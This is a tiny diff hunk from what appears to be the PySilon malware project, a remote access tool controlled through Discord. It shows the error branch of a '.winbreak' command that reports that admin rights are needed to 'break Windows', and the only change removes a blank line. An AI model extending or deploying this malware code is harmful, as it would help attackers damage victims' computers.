@@ -37,4 +37,3 @@ elif message.content == '.winbreak':
         embed = discord.Embed(title="📛 Error",description=f'```Admin permissions are required to break Windows```', colour=discord.Colour.green())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await message.channel.send(embed=embed)
-        
